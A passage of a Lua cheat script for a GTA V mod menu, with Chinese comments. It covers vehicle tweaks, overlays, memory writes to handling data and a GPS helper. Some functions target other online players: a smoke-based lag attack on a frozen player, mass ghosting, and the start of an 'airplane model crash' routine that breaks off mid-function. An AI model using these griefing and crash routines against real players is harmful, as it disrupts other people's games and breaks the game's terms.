        for i, ped in pairs(entities.get_all_peds_as_handles()) do
            delete_entity(ped)
            util.yield(10)
        end
    end

    local veh__count = 0
    for _, veh in ipairs(entities.get_all_vehicles_as_handles()) do
        veh__count = veh__count + 1
    end
    if veh__count >= veh_limit then
        util.toast("载具池达到上限,正在清理...")
        for i, veh in ipairs(entities.get_all_vehicles_as_handles()) do 
            delete_entity(veh)
            util.yield(10)
        end     
    end 

    local obj_count = 0    
    for _, obj in pairs(entities.get_all_objects_as_handles()) do    
        obj_count = obj_count + 1   
    end
    if obj_count >= obj_limit then 
        util.toast("物体池达到上限,正在清理...")
        for i, obj in pairs(entities.get_all_objects_as_handles()) do
            delete_entity(obj)
            util.yield(10)
        end
    end

    util.yield(1000)
end


----重力实体枪
shootent = -422877666
function eentity_gun()
    if PED.IS_PED_SHOOTING(PLAYER.PLAYER_PED_ID()) then
        local hash = shootent
        request_model(hash)
        local c1 = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.PLAYER_PED_ID(), 0.0, 5.0, 0.0)
        local res = raycast_gameplay_cam(-1, 1000.0)
        local dir = {}
        local c2 = {}
        if res[1] ~= 0 then
            c2 = res[2]
            dir['x'] = (c2['x'] - c1['x'])*1000
            dir['y'] = (c2['y'] - c1['y'])*1000
            dir['z'] = (c2['z'] - c1['z'])*1000
        else 
            c2 = get_offset_from_camera(1000)
            dir['x'] = (c2['x'] - c1['x'])*1000
            dir['y'] = (c2['y'] - c1['y'])*1000
            dir['z'] = (c2['z'] - c1['z'])*1000
        end
        local ent = create_object(hash, c1['x'], c1['y'], c1['z'])
        ENTITY.SET_ENTITY_NO_COLLISION_ENTITY(ent, PLAYER.PLAYER_PED_ID(), false)
        ENTITY.APPLY_FORCE_TO_ENTITY(ent, 0, dir['x'], dir['y'], dir['z'], 0.0, 0.0, 0.0, 0, true, false, true, false, true)
    end
end

------载具选项

----失控驾驶
function incontrollable_driving(toggled)
    local last_vehicle = PED.GET_VEHICLE_PED_IS_IN(PLAYER.PLAYER_PED_ID(), true)
    if toggled then
        VEHICLE.SET_VEHICLE_REDUCE_GRIP(last_vehicle, true)
        VEHICLE1._SET_VEHICLE_REDUCE_TRACTION(last_vehicle, 50)
    else
        VEHICLE.SET_VEHICLE_REDUCE_GRIP(last_vehicle, false)
        VEHICLE1._SET_VEHICLE_REDUCE_TRACTION(last_vehicle, 100)
    end
end

----快速刹车
function Quick_brake()
    local vehicle = PED.GET_VEHICLE_PED_IS_USING(PLAYER.PLAYER_PED_ID())
    if PAD.IS_CONTROL_JUST_PRESSED(0, 72) and ENTITY.GET_ENTITY_SPEED(vehicle) >= 0 and not ENTITY.IS_ENTITY_IN_AIR(vehicle) and VEHICLE.GET_PED_IN_VEHICLE_SEAT(vehicle, -1, false) == PLAYER.PLAYER_PED_ID() then
        VEHICLE.SET_VEHICLE_FORWARD_SPEED(vehicle, ENTITY.GET_ENTITY_SPEED(vehicle) / 2)
        util.yield(250)
    end
end

----漂移模式
function Drift_mode()
    local vehicle = PED.GET_VEHICLE_PED_IS_IN(PLAYER.PLAYER_PED_ID(), false)
    if PAD.IS_CONTROL_PRESSED(0, 21) then
        VEHICLE.SET_VEHICLE_REDUCE_GRIP(vehicle, true)
        VEHICLE.SET_VEHICLE_REDUCE_GRIP_LEVEL(vehicle, 0.0)
    else
        VEHICLE.SET_VEHICLE_REDUCE_GRIP(vehicle, false)
    end
end

----落地弹跳
local LwasInAir
function Landing_bounce()
    local vehicle = PED.GET_VEHICLE_PED_IS_USING(PLAYER.PLAYER_PED_ID())
    local isInAir = ENTITY.IS_ENTITY_IN_AIR(vehicle)
    if LwasInAir and not isInAir then
        local vec = ENTITY.GET_ENTITY_VELOCITY(vehicle)
        ENTITY.SET_ENTITY_VELOCITY(vehicle, vec.x, vec.y, (vec.z * -1 * 0.5))
    end
    LwasInAir = isInAir
end

----载具敲头
function muscle_car()
    if PED.IS_PED_IN_ANY_VEHICLE(PLAYER.PLAYER_PED_ID(), true) then
        local CAutomobile = entities.get_user_vehicle_as_pointer()
        local vehicleModel = ENTITY.GET_ENTITY_MODEL(entities.get_user_vehicle_as_handle())
        if VEHICLE.IS_THIS_MODEL_A_CAR(vehicleModel) or VEHICLE.IS_THIS_MODEL_AN_AMPHIBIOUS_CAR(vehicleModel) then 
            local CHandlingData = entities.vehicle_get_handling(CAutomobile)
            memory.write_float(CHandlingData + 0x00EC, PAD.IS_CONTROL_PRESSED(0, 71) and PAD.IS_CONTROL_PRESSED(0, 280) and -0.35 or 0.5)
        end
    end
end

----特殊能力
function veh_capacity(condition, offset, value)
    while _G[condition] do
        if PED.IS_PED_IN_ANY_VEHICLE(PLAYER.PLAYER_PED_ID(), true) then
            --pCVehicle = Mem:new(worldPtr):offset(0x08):offset(0xD10).readLong()
            local pCVehicle = entities.handle_to_pointer(PED.GET_VEHICLE_PED_IS_USING(PLAYER.PLAYER_PED_ID()))
            local pCModelInfo = memory.read_long(pCVehicle + 0x20)
            memory.write_byte(pCModelInfo + offset, value)
        end
        util.yield()
    end
    if PED.IS_PED_IN_ANY_VEHICLE(PLAYER.PLAYER_PED_ID(), true) then
        local pCVehicle = entities.handle_to_pointer(PED.GET_VEHICLE_PED_IS_USING(PLAYER.PLAYER_PED_ID()))
        local pCModelInfo = memory.read_long(pCVehicle + 0x20)
        memory.write_byte(pCModelInfo + offset, 0x00)
    end
end

----粘在地上
function ground_driving()
    local vehicle = PED.GET_VEHICLE_PED_IS_USING(PLAYER.PLAYER_PED_ID())
    local velocity = ENTITY.GET_ENTITY_VELOCITY(vehicle)
    local height = ENTITY.GET_ENTITY_HEIGHT_ABOVE_GROUND(vehicle)
    local controls = {32, 33, 34, 35}
    if height < 5.0 then
        if ENTITY.IS_ENTITY_IN_AIR(vehicle) then
            VEHICLE1.SET_VEHICLE_ON_GROUND_PROPERLY(vehicle)
        end
    else
        for _, key in ipairs(controls) do
            if vehicle ~= 0 and PAD.IS_CONTROL_PRESSED(0, key) then
                while not PAD.IS_CONTROL_RELEASED(0, key) and ENTITY.IS_ENTITY_IN_AIR(vehicle) do
                    ENTITY.APPLY_FORCE_TO_ENTITY(vehicle, 2, 0, 0, -500 - velocity.z, 0, 0, 0, 0, true, false, true, false, true)
                    util.yield()
                end
            end
        end
    end
end

----反向控制
function car_crash(state)
    veh = entities.get_user_vehicle_as_handle()
    if state then
        VEHICLE1._SET_VEHICLE_CONTROLS_INVERTED(veh, true)
    else
        VEHICLE1._SET_VEHICLE_CONTROLS_INVERTED(veh, false)
    end
end

--氮气加速
local nitro_duration = 2000
local nitro_power = 2000
function nnitrogen_acceleration()
    local player_cur_car = entities.get_user_vehicle_as_handle()
    if PED.IS_PED_IN_ANY_VEHICLE(PLAYER.PLAYER_PED_ID(), true) and player_cur_car ~= 0 then
        if PAD.IS_CONTROL_JUST_PRESSED(357, 357) then --x
            request_ptfx_asset('veh_xs_vehicle_mods')
            GRAPHICS.USE_PARTICLE_FX_ASSET('veh_xs_vehicle_mods')
            VEHICLE1.SET_OVERRIDE_NITROUS_LEVEL(player_cur_car, true, 100, nitro_power, 99999999999, false)
            ENTITY.SET_ENTITY_MAX_SPEED(player_cur_car, 2000)
            VEHICLE1.SET_VEHICLE_MAX_SPEED(player_cur_car, 2000)
            util.yield(nitro_duration)
            VEHICLE1.SET_OVERRIDE_NITROUS_LEVEL(player_cur_car, false, 0, 0, 0, false)
            VEHICLE1.SET_VEHICLE_MAX_SPEED(player_cur_car, 0.0)
        end
    end
end
function nnitro_duration(val)
    nitro_duration = val * 1000
end
function nnitro_power(val)
    nitro_power = val
end
initial_d_mode = false
initial_d_score = false
function on_user_change_vehicle(vehicle)
    if vehicle ~= 0 then
        if initial_d_mode then 
            set_vehicle_into_drift_mode(vehicle)
        end

        local deez_nuts = {}
        local num_seats = VEHICLE.GET_VEHICLE_MODEL_NUMBER_OF_SEATS(ENTITY.GET_ENTITY_MODEL(vehicle))
        for i=1, num_seats do
            if num_seats >= 2 then
                deez_nuts[#deez_nuts + 1] = tostring(i - 2)
            else
                deez_nuts[#deez_nuts + 1] = tostring(i)
            end
        end
        if true then 
            native_invoker.begin_call()
            native_invoker.push_arg_int(vehicle)
            native_invoker.end_call("76D26A22750E849E")
        end
    end
end


-------拉车
function update_attachment_position(attachment)
    if attachment.offset == nil then
        attachment.offset = {x=0,y=0,z=0}
    end
    if attachment.rotation == nil then
        attachment.rotation = {x=0,y=0,z=0}
    end
    if attachment.collision == nil then
        attachment.collision = true
    end
    ENTITY.ATTACH_ENTITY_TO_ENTITY(
        attachment.handle, attachment.root, attachment.bone_index or 0,
        attachment.offset.x or 0, attachment.offset.y or 0, attachment.offset.z or 0,
        attachment.rotation.x or 0, attachment.rotation.y or 0, attachment.rotation.z or 0,
        false, true, attachment.collision, false, 2, true, 0
    )
end
function get_vehicle_dimension(vehicle)
    local minimum = memory.alloc()
    local maximum = memory.alloc()
    MISC.GET_MODEL_DIMENSIONS(ENTITY.GET_ENTITY_MODEL(vehicle), minimum, maximum)
    local minimum_vec = v3.new(minimum)
    local maximum_vec = v3.new(maximum)
    return {x = maximum_vec.y - minimum_vec.y, y = maximum_vec.x - minimum_vec.x, z = maximum_vec.z - minimum_vec.z}
end
function set_attachment_offset_for_root(attachment)
    local root_model = util.reverse_joaat(ENTITY.GET_ENTITY_MODEL(attachment.root))
    local dimensions = get_vehicle_dimension(attachment.handle)
    if root_model == "wastelander" then
        attachment.offset = {
            x=0,
            y=(dimensions.y / 2) - 2,
            z=(dimensions.z / 2) + 0.8
        }
    end
    if root_model == "slamtruck" then
        attachment.offset = {
            x=0,
            y=(dimensions.y / 2) - 3,
            z=(dimensions.z / 2) + 0.3
        }
        attachment.rotation = {
            x=8,
            y=0,
            z=0,
        }
    end
end
function attach(attachment)
    attachment.position = ENTITY.GET_ENTITY_COORDS(attachment.root)
    ENTITY.SET_ENTITY_HAS_GRAVITY(attachment.handle, false)
    set_attachment_offset_for_root(attachment)
    update_attachment_position(attachment)
    ENTITY.SET_ENTITY_NO_COLLISION_ENTITY(attachment.root, attachment.handle)
    return attachment
end
statecar = {}
function detach_attached_vehicle()
    if statecar.attached_vehicle ~= nil then
        util.toast("已分离 "..statecar.attached_vehicle.name)
        ENTITY.DETACH_ENTITY(statecar.attached_vehicle.handle, true, true)
        statecar.attached_vehicle = nil
    end
end
function attach_nearest_vehicle()
    local player_vehicle = entities.get_user_vehicle_as_handle()
    if not player_vehicle then
        util.toast("您必须在车辆中才能附加")
        return
    end
    local pos = ENTITY.GET_ENTITY_COORDS(player_vehicle, 1)
    local range = 20
    local nearby_vehicles = entities.get_all_vehicles_as_handles()
    local count = 0
    for _, vehicle_handle in ipairs(nearby_vehicles) do
        if vehicle_handle ~= player_vehicle then
            local attachment = {handle=vehicle_handle, root=player_vehicle}
            attachment.position = ENTITY.GET_ENTITY_COORDS(attachment.handle, 1)
            attachment.distance = SYSTEM.VDIST(pos.x, pos.y, pos.z, attachment.position.x, attachment.position.y, attachment.position.z)
            if attachment.distance <= range then
                detach_attached_vehicle()
                attachment.name = VEHICLE.GET_DISPLAY_NAME_FROM_VEHICLE_MODEL(ENTITY.GET_ENTITY_MODEL(attachment.handle))
                util.toast("已附加 "..attachment.name)
                attach(attachment)
                statecar.attached_vehicle = attachment
                return
            end
        end
    end
end


--烟雾掉帧
function fumes(pid)
    if is_UltimateUser(pid) and pid ~= PLAYER.PLAYER_ID() then util.toast(BlockAttackUltimateUser) return end
    local freeze_toggle = menu.ref_by_rel_path(menu.player_root(pid), "Trolling>Freeze")
    local player_pos = players.get_position(pid)
    menu.set_value(freeze_toggle, true)
    request_ptfx_asset("core")
    GRAPHICS.USE_PARTICLE_FX_ASSET("core")
    GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD("exp_extinguisher", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
    menu.set_value(freeze_toggle, false)
end


----按键显示
function newColor(R, G, B, A)
    return {r = R, g = G, b = B, a = A}
end
size = 0.03
boxMargin = size / 7
overlay_x = 0.0400
overlay_y = 0.1850
local push_x, push_y = directx.get_client_size()
local ratio = push_x / push_y
local spaceBarLength = 3
local spaceBarSlim = 1
local altSpaceBar = 0
local key_text_color = newColor(1, 1, 1, 1)
local background_colour = newColor(0, 0, 0, 0.2)
local pressed_background_colour = newColor(2.55/255, 2.55/255, 2.55/255, 0.5490196078431373)
local wasd = {
    [1]  = { keys = {44, 52, 85, 138, 141, 152, 205, 264},                                               pressed = false, key = 'Q',     show = true },
    [2]  = { keys = {32, 71, 77, 87, 129, 136, 150, 232},                                                pressed = false, key = 'W',     show = true },
    [3]  = { keys = {38, 46, 51, 54, 86, 103, 119, 153, 184, 206, 350, 351, 355, 356},                   pressed = false, key = 'E',     show = true },
    [4]  = { keys = {45, 80, 140, 250, 263, 310},                                                        pressed = false, key = 'R',     show = true },
    [5]  = { keys = {34 ,63, 89, 133, 147, 234, 338},                                                    pressed = false, key = 'A',     show = true },
    [6]  = { keys = {8, 31, 33, 72, 78, 88, 130, 139, 149, 151, 196, 219, 233, 268, 269, 302},           pressed = false, key = 'S',     show = true },
    [7]  = { keys = {9, 30, 35, 59, 64, 90, 134, 146, 148, 195, 218, 235, 266, 267, 278, 279, 339, 342}, pressed = false, key = 'D',     show = true },
    [8]  = { keys = {23, 49, 75, 145, 185, 251},                                                         pressed = false, key = 'F',     show = true },
    [9]  = { keys = {21, 61, 131, 155, 209, 254, 340, 352},                                              pressed = false, key = 'Shift', show = true },
    [10] = { keys = {36, 60, 62, 132, 224, 280, 281, 326, 341, 343},                                     pressed = false, key = 'Ctrl',  show = true },
    [11] = { keys = {18, 22, 55, 76, 102, 143, 179, 203, 216, 255, 298, 321, 328, 353},                  pressed = false, key = 'Space', show = true },
}
function key_display()
    for i = 1, #wasd do
        wasd[i].pressed = false
        for j = 1, #wasd[i].keys do
            if PAD.IS_CONTROL_PRESSED(2, wasd[i].keys[j]) then
                wasd[i].pressed = true
            end
        end
    end
    for i = 1, #wasd - 3 do
        if wasd[i].show then
            directx.draw_rect(overlay_x + (boxMargin + size) * (i > 4 and i - 5 or i - 1), overlay_y + (i > 4 and (boxMargin + size * ratio) or 0)* 1.05, size, size * ratio, wasd[i].pressed and pressed_background_colour or background_colour)
            if not hideKey then
                directx.draw_text(overlay_x + (boxMargin + size) * (i > 4 and i - 5 or i - 1)+ size * 0.45,(i > 4 and  overlay_y + (boxMargin + size * ratio)* 1.2 or  overlay_y*1.07) , wasd[i].key, 1, size *20, key_text_color, false)
            end
        end
    end
    if altShiftCtrl then
        if wasd[#wasd - 2].show then
            directx.draw_rect(overlay_x, overlay_y + (boxMargin + size)* ratio * 2,(boxMargin + size) - boxMargin, size * ratio / 2, wasd[#wasd - 2].pressed and pressed_background_colour or background_colour)
        end
        if wasd[#wasd - 1].show then
            directx.draw_rect(overlay_x, overlay_y + (boxMargin + size)* ratio * 2.5,(boxMargin + size) - boxMargin, size * ratio / 2, wasd[#wasd - 1].pressed and pressed_background_colour or background_colour)
        end
    else
        for i = 9, 10 do
            if wasd[i].show then
            directx.draw_rect(overlay_x - (boxMargin + size), overlay_y + (boxMargin + size * ratio) * (i - 8) * 1.05, size, size * ratio, wasd[i].pressed and pressed_background_colour or background_colour)
            if not hideKey then
                directx.draw_text(overlay_x - (boxMargin + size)+ size * 0.45,(i > 4 and  overlay_y + (boxMargin + size * ratio) * (i - 8)* 1.2 or  overlay_y*1.07) , wasd[i].key, 1, size *20, key_text_color, false)

            end
            end
        end
    end
    if wasd[#wasd].show then
        directx.draw_rect(overlay_x + (boxMargin + size) * altSpaceBar, overlay_y + (boxMargin + size)* ratio * 2,(boxMargin + size) * spaceBarLength - boxMargin, size * ratio / spaceBarSlim, wasd[#wasd].pressed and pressed_background_colour or background_colour)
    end
end


-----绘制血量条
function ndraw_rect(x, y, width, height, colourd)
	GRAPHICS.DRAW_RECT(x, y, width, height, colourd.r, colourd.g, colourd.b, colourd.a, false)
end
function draw_health_bar(ped, maxDistance)
	local myPos = players.get_position(PLAYER.PLAYER_ID())
	local pedPos = ENTITY.GET_ENTITY_COORDS(ped, true)
	local distance = myPos:distance(pedPos)
	if distance >= maxDistance then return end
	local distPerc = 1.0 - distance / maxDistance
	local healthPerc = 0.0
	local armourPerc = 0.0
	if not PED.IS_PED_FATALLY_INJURED(ped) then
		local armour = PED.GET_PED_ARMOUR(ped)
		armourPerc = armour / 100.0
		if armourPerc > 1.0 then armourPerc = 1.0 end
		local health = ENTITY.GET_ENTITY_HEALTH(ped) - 100.0
		local maxHealth = PED.GET_PED_MAX_HEALTH(ped) - 100.0
		healthPerc = health / maxHealth
		if healthPerc > 1.0 then healthPerc = 1.0 end
	end
	local maxLength = 0.05 * distPerc ^3
	local height = 0.008 * distPerc ^1.5
	local pos = PED.GET_PED_BONE_COORDS(ped, 0x322C --[[head]], 0.35, 0.0, 0.0)
	local pScreenX, pScreenY = memory.alloc(4), memory.alloc(4)
	if not GRAPHICS.GET_SCREEN_COORD_FROM_WORLD_COORD(pos.x, pos.y, pos.z, pScreenX, pScreenY) then
		return
	end
	local screenX = memory.read_float(pScreenX)
	local screenY = memory.read_float(pScreenY)
	local barLength = interpolate(0.0, maxLength, healthPerc)
	local colour = get_blended_colour(healthPerc)
	ndraw_rect(screenX, screenY, maxLength + 0.002, height + 0.002, {r = 0, g = 0, b = 0, a = 120})
	ndraw_rect(screenX - maxLength/2 + barLength/2, screenY, barLength, height, colour)
	barLength = interpolate(0.0, maxLength, armourPerc)
	colour = get_hud_colour(HudColour.radarArmour)
	ndraw_rect(screenX, screenY + 1.5 * height, maxLength + 0.002, height + 0.002, {r = 0, g = 0, b = 0, a = 120})
	ndraw_rect(screenX - maxLength/2 + barLength/2, screenY + 1.5 * height, barLength, height, colour)
end


----------GPS导航/////lib
b_common_funcs = {}
b_common_funcs.new = function ()
    local self = {}
    self.address_from_pointer_chain = function (basePtr, offsets)
        local addr = memory.read_long(basePtr)
        for k = 1, (#offsets - 1) do
            addr = memory.read_long(addr + offsets[k])
            if addr == 0 then
                return 0
            end
        end
        addr = addr + offsets[#offsets]
        return addr
    end
    self.get_player_vehicle_class = function ()
        local veh = entities.get_user_vehicle_as_handle()
        return VEHICLE.GET_VEHICLE_CLASS(veh)
    end
    self.get_ascpect_ratio = function()
        local screen_x, screen_y = directx.get_client_size()
    
        return screen_x / screen_y
    end
    self.to_bits = function(num)
        local t={}
        while num>0 do
            rest=math.fmod(num,2)
            t[#t+1]=rest
            num=(num-rest)/2
        end
        return t
    end
    self.split = function (input, sep)
        local t={}
        for str in string.gmatch(input, "([^"..sep.."]+)") do
                table.insert(t, str)
        end
        return t
    end
    local minimum = memory.alloc()
    local maximum = memory.alloc()
    self.get_pos_above_entity = function (entity)
        MISC.GET_MODEL_DIMENSIONS(ENTITY.GET_ENTITY_MODEL(entity), minimum, maximum)
        local maximum_vec = memory.read_vector3(maximum)
        return ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(entity, 0, 0, maximum_vec.z)
    end
    self.copy_File = function(old_path, new_path)
        local old_file = io.open(old_path, "rb")
        local new_file = io.open(new_path, "wb")
        local old_file_sz, new_file_sz = 0, 0
        if not old_file or not new_file then
          return false
        end
        while true do
          local block = old_file:read(2^13)
          if not block then 
            old_file_sz = old_file:seek( "end" )
            break
          end
          new_file:write(block)
        end
        old_file:close()
        new_file_sz = new_file:seek( "end" )
        new_file:close()
        return new_file_sz == old_file_sz
      end
    return self
end
b_math_funcs = {}
b_math_funcs.new = function ()
    local self = {}
    self.lerp = function(a, b, t)
        return a + (b - a) * t
    end
    local EPSILON = 0.0000001
    self.RayIntersectsTriangle = function(rayOrigin, rayDirection, vertex1, vertex2, vertex3)
        local edge1, edge2, h, s, q, a, f, u, v
        edge1 = {x = vertex2.x - vertex1.x, y = vertex2.y - vertex1.y, z = vertex2.z - vertex1.z}
        edge2 = {x = vertex3.x - vertex1.x, y = vertex3.y - vertex1.y, z = vertex3.z - vertex1.z}
        h = {
            x =    edge2.y * rayDirection.z - edge2.z * rayDirection.y,
            y =    edge2.z * rayDirection.x - edge2.x * rayDirection.z,
            z =    edge2.x * rayDirection.y - edge2.y * rayDirection.x
        }
        a = h.x * edge1.x + h.y * edge1.y + h.z * edge1.z

        if a > -EPSILON and a < EPSILON then return false end

        f = 1.0/a
        s = {x = rayOrigin.x - vertex1.x, y = rayOrigin.y - vertex1.y, z = rayOrigin.z - vertex1.z}
        u = f * (h.x * s.x + h.y * s.y + h.z * s.z)
        if u < 0.0 or u > 1.0 then return false end
        q = {
            x =    edge1.y * s.z - edge1.z * s.y,
            y =    edge1.z * s.x - edge1.x * s.z,
            z =    edge1.x * s.y - edge1.y * s.x
        }
        v = f * (rayDirection.x * q.x + rayDirection.y * q.y + rayDirection.z * q.z)
        if v < 0.0 or u + v > 1.0 then return false end
        t = f *  (edge2.x * q.x + edge2.y * q.y + edge2.z * q.z)
        if t > EPSILON then
            return true, {
                x = rayOrigin.x + rayDirection.x * t,
                y = rayOrigin.y + rayDirection.y * t,
                z = rayOrigin.z + rayDirection.z * t
            }
        else
            return false
        end
    end
    return self
end
b_vectors = {}
b_vectors.new = function ()
    local self = {}
    self.vector2 = {}
    self.vector2.new = function (x, y)
        return {x = x, y = y}
    end
    self.vector2.dot = function(vector_a, vector_b)
        return (vector_a.x * vector_b.x) + (vector_a.y * vector_b.y)
    end
    self.vector2.magnitude = function(vector)
        return math.sqrt((vector.x * vector.x) + (vector.y * vector.y))
    end
    self.vector2.get_angle = function(vector_a, vector_b)
        return math.acos(self.vector2.dot(vector_a, vector_b) / self.vector2.magnitude(vector_a) / self.vector2.magnitude(vector_b))
    end
    self.vector3 = {}
    self.vector3.new = function (x, y, z)
        return {x = x, y = y, z = z}
    end
    self.vector3.add = function(a, b)
        return self.vector3.new(a.x + b.x, a.y + b.y, a.z + b.z)
    end
    self.vector3.sub = function(a, b)
        return self.vector3.new(a.x - b.x, a.y - b.y, a.z - b.z)
    end
    self.vector3.multiply = function (vec, num)
        return {x = vec.x * num, y = vec.y * num, z = vec.z * num}
    end
    return self
end


local player_ped_id
local delta_time
local player_pos
util.create_tick_handler(function ()
    player_ped_id = PLAYER.PLAYER_PED_ID()
    delta_time = MISC.GET_FRAME_TIME()
    player_pos = ENTITY.GET_ENTITY_COORDS(player_ped_id)
    return true
end)
local math_funcs = b_math_funcs.new()
local shitty_gps_colour_a = {r = 1,g = 0,b = 1,a = 1}
local shitty_gps_run = false
function GPS_navigation(value)
    local p_direction = memory.alloc(1) --bool
    local p_5 = memory.alloc(4) --float
    local p_distToNxJunction = memory.alloc(4) --float
    local p_screenX = memory.alloc(4) --float
    local p_screenY = memory.alloc(4) --float
    local turn_dir = 0
    shitty_gps_run = value
    if value then
        util.create_tick_handler(function ()
            local vehicle = PED.GET_VEHICLE_PED_IS_IN(PLAYER.PLAYER_PED_ID(), false)
            local waypoint_pos = get_waypoint_coords()
            local total = waypoint_pos.x + waypoint_pos.y + waypoint_pos.z
            if total ~= 0 and ENTITY.IS_ENTITY_A_VEHICLE(vehicle) then
                local height = ENTITY.GET_ENTITY_HEIGHT(vehicle, player_pos.x, player_pos.y, player_pos.z, true, false)
                PATHFIND.GENERATE_DIRECTIONS_TO_COORD(
                    waypoint_pos.x,
                    waypoint_pos.y,
                    waypoint_pos.z,
                    0,
                    p_direction,
                    p_5,
                    p_distToNxJunction
                )
                local direction = memory.read_byte(p_direction)
                local distToNxJunction = memory.read_float(p_distToNxJunction) - 18
                GRAPHICS.GET_SCREEN_COORD_FROM_WORLD_COORD(
                    player_pos.x,
                    player_pos.y,
                    player_pos.z + 1.5 + height,
                    p_screenX,
                    p_screenY
                )
                local screen_x = memory.read_float(p_screenX)
                local screen_y = memory.read_float(p_screenY)
            if direction == 1 then
                    turn_dir = math_funcs.lerp(turn_dir, 180, 5 * delta_time)
                    directx.draw_text(screen_x, screen_y, "请在前方路口调头", ALIGN_CENTRE, 1, shitty_gps_colour_a)
                elseif direction == 3 then      
                    turn_dir =  math_funcs.lerp(turn_dir, -90, 5 * delta_time)
                    if math.floor(distToNxJunction) > -1 then
                        directx.draw_text(screen_x,screen_y,"请在前方路口" .. math.floor(distToNxJunction) .. " 米后左转 ",ALIGN_CENTRE,1,shitty_gps_colour_a)
                    end
                elseif direction == 6 then
                    turn_dir =  math_funcs.lerp(turn_dir, -145, 5 * delta_time)
                    if math.floor(distToNxJunction) > -1 then
                        directx.draw_text(screen_x,screen_y, math.floor(distToNxJunction) .. " 米后向左急转弯 ",ALIGN_CENTRE,1,shitty_gps_colour_a)
                    end
                elseif direction == 4 then          
                    turn_dir =  math_funcs.lerp(turn_dir, 90, 5 * delta_time)
                    if math.floor(distToNxJunction) > -1 then
                        directx.draw_text(screen_x,screen_y,"请在前方路口 " .. math.floor(distToNxJunction) .. " 米后右转",ALIGN_CENTRE,1,shitty_gps_colour_a)
                    end
                elseif direction == 7 then
                    turn_dir =  math_funcs.lerp(turn_dir, 145, 5 * delta_time)
                    if math.floor(distToNxJunction) > -1 then
                        directx.draw_text(screen_x,screen_y,math.floor(distToNxJunction) .. " 米后向右急转弯 " ,ALIGN_CENTRE,1,shitty_gps_colour_a)
                    end
                elseif direction == 8 then
                    turn_dir =  math_funcs.lerp(turn_dir, 0, 5 * delta_time)
                    directx.draw_text(screen_x, screen_y, "正在重新规划路线    ", ALIGN_CENTRE, 1, shitty_gps_colour_a)
                else
                    turn_dir =  math_funcs.lerp(turn_dir, 0, 5 * delta_time)
                end
                direction = ENTITY.GET_ENTITY_FORWARD_VECTOR(player_ped_id)
                local angle = b_vectors.new().vector2.get_angle(direction, {x = 0, y = 1})
                if b_vectors.new().vector2.dot({x = direction.x, y = direction.y}, {x = 1, y = 0}) > 0 then
                    angle = -angle
                end
                local draw_pos = b_common_funcs.new().get_pos_above_entity(vehicle)
                draw_pos.z = draw_pos.z + 0.4
                drawing_funcs.draw_arrow(draw_pos, angle - math.rad(turn_dir), 1, {r = 255,g = 0,b = 255,a = 255}, {r = 255,g = 255,b = 255,a = 255})
            end
            return shitty_gps_run
        end)
    end
end


----全局幽灵
function give_all_ghost(toggled)
    allPghost = toggled
    while allPghost do
        for pid = 0, 31 do
            NETWORK.SET_REMOTE_PLAYER_AS_GHOST(pid, true)
        end
        util.yield()
    end
    for pid = 0, 31 do
        NETWORK.SET_REMOTE_PLAYER_AS_GHOST(pid, false)
    end
end

----雪球大战
function snowball_War()
    local plist = players.list()
    local snowballs = util.joaat('WEAPON_SNOWBALL')
    for i = 1, #plist do
        local plyr = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(plist[i])
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(plyr, snowballs, 20, true)
        WEAPON.SET_PED_AMMO(plyr, snowballs, 20)
        players.send_sms(plist[i], PLAYER.PLAYER_ID(), '雪球大战!你获得了雪球')
        util.yield()
    end
end

----烟花大战
function Fireworks_War()
    local plist = players.list()
    local fireworks = util.joaat('weapon_firework')
    for i = 1, #plist do
        local plyr = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(plist[i])
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(plyr, fireworks, 20, true)
        WEAPON.SET_PED_AMMO(plyr, fireworks, 20)
        players.send_sms(plist[i], PLAYER.PLAYER_ID(), '烟花大战!你获得了烟花')
        util.yield()
    end
end

----升级载具
function upgrade_vehicle(vehicle)
    VEHICLE.SET_VEHICLE_MOD_KIT(vehicle, 0)
    for i = 0, 50 do
        local num = VEHICLE.GET_NUM_VEHICLE_MODS(vehicle, i)
        VEHICLE.SET_VEHICLE_MOD(vehicle, i, num - 1, true)
    end

    VEHICLE.SET_VEHICLE_TYRES_CAN_BURST(vehicle, false)
    VEHICLE.SET_VEHICLE_WHEELS_CAN_BREAK(vehicle, false)
    VEHICLE.SET_VEHICLE_HAS_UNBREAKABLE_LIGHTS(vehicle, true)
    VEHICLE.SET_VEHICLE_CAN_ENGINE_MISSFIRE(vehicle, false)
    VEHICLE.SET_VEHICLE_CAN_LEAK_OIL(vehicle, false)
    VEHICLE.SET_VEHICLE_CAN_LEAK_PETROL(vehicle, false)

    VEHICLE.SET_DISABLE_VEHICLE_ENGINE_FIRES(vehicle, true)
    VEHICLE.SET_DISABLE_VEHICLE_PETROL_TANK_FIRES(vehicle, true)
    VEHICLE.SET_DISABLE_VEHICLE_PETROL_TANK_DAMAGE(vehicle, true)

    for i = 0, 3 do
        VEHICLE.SET_DOOR_ALLOWED_TO_BE_BROKEN_OFF(vehicle, i, false)
    end
    VEHICLE.SET_HELI_TAIL_BOOM_CAN_BREAK_OFF(vehicle, false)

end

----给予所有玩家MK-2
function give_oppressor()
    for k, pid in pairs(players.list(true, true, true)) do
        local ped = PLAYER.GET_PLAYER_PED(pid)
        local c = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(ped, 0.0, 5.0, 0.0)
        local hash = util.joaat("oppressor2")
        request_model(hash)
        local oppressor = entities.create_vehicle(hash, c, ENTITY.GET_ENTITY_HEADING(ped))
        ENTITY.SET_ENTITY_INVINCIBLE(oppressor)
        upgrade_vehicle(oppressor)
    end
end


------飞机模型崩溃
local crash_planes = {'microlight', 'cuban800', 'tula', 'alphaz1', 'velum2', 'nimbus', 'seabreeze'}
local plane_crash_coords = {
    {-1718.5878, -982.02405, 322.83115},
    {-2671.5007, 3404.2637, 455.1972},
    {9.977266, 6621.406, 306.46536 },
    {3529.1458, 3754.5452, 109.96472},
    {252, 2815, 120},
}
local to_ply = 1
function airplane_collapsed1()
    if PED.IS_PED_IN_ANY_VEHICLE(PLAYER.PLAYER_PED_ID(), false) then
